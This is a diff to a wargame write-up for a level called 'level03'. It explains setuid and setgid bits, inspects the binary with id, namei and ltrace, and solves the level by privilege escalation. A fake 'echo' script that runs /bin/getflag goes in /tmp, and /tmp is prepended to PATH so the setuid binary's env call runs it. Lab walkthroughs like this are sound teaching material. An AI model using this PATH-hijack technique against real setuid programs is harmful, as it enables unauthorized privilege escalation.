@@ -3,13 +3,37 @@
 - Inspect
   - ❌ `file` `readelf` `strings` 
   - ✅ `ltrace` 
-```b
+```
 > ls -l
 -rwsr-sr-x 1 flag03 level03 8627 level03
-   ^  ^ setuid bit & setgid bit are set
-  👉 when the binary is exec functions called inside it
-  are called under same level of permission
+ ^^^       owner flag03 can rwx also setuid bit is set
+    ^^^    group level03 can rx plus setgid bit (s) is set
+       ^^^ others can rx
+
+👉 when ./level03 is run
+  the entire process runs with owner flag03's priviledges
+  ie. I, user level00, can exploit priviledges limited to flag03
+
+👉 conclusion: execute the ./level03 and doing so we gain
+  temporary elevated permissions as flag03
 ```
+
+- We may also try `id` & `namei`
+
+```b
+> id
+uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
+
+> namei -l ./level03 
+dr-x------ level03 level03 .
+-rwsr-sr-x flag03  level03 level03
+
+> namei -l /bin/getflag
+-rwxr-xr-x root root getflag
+```
+
+- `ltrace` traces library function calls when the binary is executed
+
 ```b
 > ltrace ./level03
   👉 we can see the `s` bit in action
@@ -22,21 +46,19 @@ setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
 system("/usr/bin/env echo Exploit me" ...
 
 ### observations
-  👉 getegid & geteuid return a effective group/user ID ie. 2003
-  👉 setresgid & setresuid set Real/Effective/Saved ID to ensure
-  that the process maintains privileges
-  👉 `/usr/bin/env echo` uses a vulnerable relative path
-  since ./level03 has high privileges,
-  we can fake a false echo to run getflag inside ./level03
-```
-```b
-> whereis getflag
-getflag: /bin/getflag
+👉 getegid & geteuid return a effective group/user ID 2003 
+  which is my `id` as `level03`.
+👉 Because privileges are elevated during the process
+  we have temporary permissions as `flag03`.
+👉 This way we can exploit the `/usr/bin/env echo`
+  relative path vulnerability.
 ```
 
 - Solution
 
 ```b
+> whereis getflag
+getflag: /bin/getflag
 > echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
 > chmod +x /tmp/echo
 > export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
